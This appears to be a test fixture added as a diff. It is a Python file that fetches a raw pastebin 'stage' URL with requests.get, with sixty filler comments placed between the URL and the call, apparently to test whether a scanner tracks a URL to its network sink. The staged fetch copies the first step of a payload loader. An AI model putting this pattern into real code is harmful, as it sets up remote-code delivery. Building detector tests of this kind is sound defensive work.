@@ -1,0 +1,65 @@
+import requests
+
+STAGE_URL = "https://pastebin.com/raw/abc123"
+FETCH_URL = STAGE_URL
+# Deliberate distance from URL definition to sink call: 01.
+# Deliberate distance from URL definition to sink call: 02.
+# Deliberate distance from URL definition to sink call: 03.
+# Deliberate distance from URL definition to sink call: 04.
+# Deliberate distance from URL definition to sink call: 05.
+# Deliberate distance from URL definition to sink call: 06.
+# Deliberate distance from URL definition to sink call: 07.
+# Deliberate distance from URL definition to sink call: 08.
+# Deliberate distance from URL definition to sink call: 09.
+# Deliberate distance from URL definition to sink call: 10.
+# Deliberate distance from URL definition to sink call: 11.
+# Deliberate distance from URL definition to sink call: 12.
+# Deliberate distance from URL definition to sink call: 13.
+# Deliberate distance from URL definition to sink call: 14.
+# Deliberate distance from URL definition to sink call: 15.
+# Deliberate distance from URL definition to sink call: 16.
+# Deliberate distance from URL definition to sink call: 17.
+# Deliberate distance from URL definition to sink call: 18.
+# Deliberate distance from URL definition to sink call: 19.
+# Deliberate distance from URL definition to sink call: 20.
+# Deliberate distance from URL definition to sink call: 21.
+# Deliberate distance from URL definition to sink call: 22.
+# Deliberate distance from URL definition to sink call: 23.
+# Deliberate distance from URL definition to sink call: 24.
+# Deliberate distance from URL definition to sink call: 25.
+# Deliberate distance from URL definition to sink call: 26.
+# Deliberate distance from URL definition to sink call: 27.
+# Deliberate distance from URL definition to sink call: 28.
+# Deliberate distance from URL definition to sink call: 29.
+# Deliberate distance from URL definition to sink call: 30.
+# Deliberate distance from URL definition to sink call: 31.
+# Deliberate distance from URL definition to sink call: 32.
+# Deliberate distance from URL definition to sink call: 33.
+# Deliberate distance from URL definition to sink call: 34.
+# Deliberate distance from URL definition to sink call: 35.
+# Deliberate distance from URL definition to sink call: 36.
+# Deliberate distance from URL definition to sink call: 37.
+# Deliberate distance from URL definition to sink call: 38.
+# Deliberate distance from URL definition to sink call: 39.
+# Deliberate distance from URL definition to sink call: 40.
+# Deliberate distance from URL definition to sink call: 41.
+# Deliberate distance from URL definition to sink call: 42.
+# Deliberate distance from URL definition to sink call: 43.
+# Deliberate distance from URL definition to sink call: 44.
+# Deliberate distance from URL definition to sink call: 45.
+# Deliberate distance from URL definition to sink call: 46.
+# Deliberate distance from URL definition to sink call: 47.
+# Deliberate distance from URL definition to sink call: 48.
+# Deliberate distance from URL definition to sink call: 49.
+# Deliberate distance from URL definition to sink call: 50.
+# Deliberate distance from URL definition to sink call: 51.
+# Deliberate distance from URL definition to sink call: 52.
+# Deliberate distance from URL definition to sink call: 53.
+# Deliberate distance from URL definition to sink call: 54.
+# Deliberate distance from URL definition to sink call: 55.
+# Deliberate distance from URL definition to sink call: 56.
+# Deliberate distance from URL definition to sink call: 57.
+# Deliberate distance from URL definition to sink call: 58.
+# Deliberate distance from URL definition to sink call: 59.
+# Deliberate distance from URL definition to sink call: 60.
+response = requests.get(FETCH_URL)
